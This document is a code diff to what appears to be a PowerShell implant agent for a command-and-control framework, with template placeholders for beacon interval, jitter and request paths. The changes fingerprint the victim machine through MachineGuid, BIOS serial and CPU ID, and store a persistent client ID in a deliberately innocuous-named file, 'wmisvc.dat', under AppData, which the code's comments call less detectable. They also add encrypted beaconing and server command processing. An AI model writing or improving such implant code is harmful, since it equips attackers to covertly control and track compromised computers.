@@ -16,6 +16,9 @@ $fileRequestPath = '{{FILE_REQUEST_PATH}}'
 # Initialize encryption key as null - will be obtained from server
 $global:encryptionKey = $null
 
+# Initialize client ID storage
+$global:clientId = $null
+
 {{PATH_ROTATION_CODE}}
 
 # Function to encrypt data for C2 communication
@@ -141,16 +144,62 @@ function Get-SystemIdentification {
         TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
     }
     
-    # Generate a unique client identifier (will be used later for re-registration)
-    $clientId = [Guid]::NewGuid().ToString()
-    $systemInfo.ClientId = $clientId
+    # Generate a unique client identifier (will persist across sessions)
+    if ($global:clientId) {
+        # Use existing client ID if we have one
+        $systemInfo.ClientId = $global:clientId
+    } else {
+        # Generate a new unique identifier
+        $machineId = [Guid]::NewGuid().ToString()
     
-    # Get Machine GUID - this is a relatively stable identifier
-    try {
-        $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
-        $systemInfo.MachineGuid = $machineGuid
-    } catch {
-        $systemInfo.MachineGuid = "Unknown"
+        # Get Machine GUID - this is a relatively stable identifier
+        try {
+            $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
+            $systemInfo.MachineGuid = $machineGuid
+            
+            # Use Machine GUID as the basis for client ID if available
+            $machineId = $machineGuid
+        } catch {
+            $systemInfo.MachineGuid = "Unknown"
+        }
+        
+        # Create a stable client ID using machine-specific information
+        $computerName = $systemInfo.Hostname
+        $userName = $systemInfo.Username
+        
+        # Get BIOS and CPU information if available
+        try {
+            $bios = Get-CimInstance -Class Win32_BIOS -ErrorAction SilentlyContinue
+            $systemInfo.BiosSerial = $bios.SerialNumber
+            $biosId = $bios.SerialNumber
+        } catch {
+            $systemInfo.BiosSerial = "Unknown"
+            $biosId = "Unknown"
+        }
+        
+        try {
+            $cpu = Get-CimInstance -Class Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
+            $systemInfo.CpuId = $cpu.ProcessorId
+            $cpuId = $cpu.ProcessorId
+        } catch {
+            $systemInfo.CpuId = "Unknown"
+            $cpuId = "Unknown"
+        }
+        
+        # If we don't have the Machine GUID, create a composite identifier
+        if ($machineId -eq "Unknown" -or $machineId -eq $null) {
+            # Create a composite string from hardware identifiers
+            $idString = "$computerName|$userName|$biosId|$cpuId"
+            
+            # Hash it for a stable ID
+            $shaHash = [System.Security.Cryptography.SHA256]::Create()
+            $hashBytes = $shaHash.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($idString))
+            $machineId = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 32)
+        }
+        
+        # Store and return the client ID
+        $global:clientId = $machineId
+        $systemInfo.ClientId = $machineId
     }
     
     # Get MAC address of first network adapter
@@ -341,9 +390,6 @@ function Get-DirectoryListing {
     }
 }
 
-# Function to process commands from the C2 server
-# Function to process commands from the C2 server
-# Function to process commands from the C2 server
 # Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
@@ -597,6 +643,14 @@ function Check-PathRotation {
 function Process-ServerResponseHeaders {
     param($WebClient)
     
+    # Check for client ID from server
+    $serverClientId = $WebClient.ResponseHeaders["X-Client-ID"]
+    if ($serverClientId) {
+        # Store the server-assigned ID
+        $global:clientId = $serverClientId
+        Write-Host "Server assigned client ID: $serverClientId"
+    }
+    
     # Check for rotation information in headers
     if ($global:pathRotationEnabled) {
         $rotationId = $WebClient.ResponseHeaders["X-Rotation-ID"]
@@ -628,15 +682,71 @@ function Process-ServerResponseHeaders {
     }
 }
 
+# Create a persistent storage for client ID
+function Save-ClientId {
+    param([string]$ClientId)
+    
+    if (-not $ClientId) {
+        return
+    }
+    
+    try {
+        # Create a storage location that's less detectable
+        $storageDir = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows")
+        if (-not (Test-Path $storageDir)) {
+            New-Item -Path $storageDir -ItemType Directory -Force | Out-Null
+        }
+        
+        # Store the client ID in an innocuous-looking file
+        $storageFile = Join-Path $storageDir "wmisvc.dat"
+        
+        # Encrypt the client ID with simple obfuscation
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($ClientId)
+        $encodedId = [Convert]::ToBase64String($bytes)
+        
+        # Save to file
+        [System.IO.File]::WriteAllText($storageFile, $encodedId)
+        
+        Write-Host "Client ID saved to persistent storage"
+    }
+    catch {
+        Write-Host "Warning: Unable to save client ID to persistent storage: $_"
+    }
+}
+
+# Loads the client ID from persistent storage
+function Load-ClientId {
+    try {
+        $storageFile = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows\wmisvc.dat")
+        if (Test-Path $storageFile) {
+            $encodedId = [System.IO.File]::ReadAllText($storageFile)
+            $bytes = [Convert]::FromBase64String($encodedId)
+            $clientId = [System.Text.Encoding]::UTF8.GetString($bytes)
+            return $clientId
+        }
+    }
+    catch {
+        Write-Host "Warning: Unable to load client ID from persistent storage: $_"
+    }
+    return $null
+}
+
 # Main agent loop
 function Start-AgentLoop {
     $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
     $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
     
+    # Try to load previously stored client ID
+    $loadedClientId = Load-ClientId
+    if ($loadedClientId) {
+        $global:clientId = $loadedClientId
+        Write-Host "Loaded client ID from persistent storage: $global:clientId"
+    }
+    
     # Get system information for identification
     $systemInfo = Get-SystemIdentification
     
-    # Consistent client ID for this instance
+    # Extract client ID from system info
     $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
     $clientId = $systemInfoObj.ClientId
     $hostname = $systemInfoObj.Hostname
@@ -666,7 +776,8 @@ function Start-AgentLoop {
             $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
             
             # Add client ID
-            $webClient.Headers.Add("X-Client-ID", $clientId)
+            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfoRaw
+            $webClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
             
             # Add current rotation ID if path rotation is enabled
             if ($global:pathRotationEnabled) {
@@ -696,6 +807,12 @@ function Start-AgentLoop {
             # Reset failure counter on successful connection
             $consecutiveFailures = 0
             $usingFallbackPaths = $false
+            
+            # Save client ID to persistent storage if it's new or changed
+            if ($global:clientId -and ($global:clientId -ne $loadedClientId)) {
+                Save-ClientId -ClientId $global:clientId
+                $loadedClientId = $global:clientId
+            }
             
             # Process response if not empty
             if ($response.Length -gt 0) {
@@ -756,5 +873,6 @@ function Start-AgentLoop {
         Start-Sleep -Seconds $actualInterval
     }
 }
+
 # Start the agent
 Start-AgentLoop
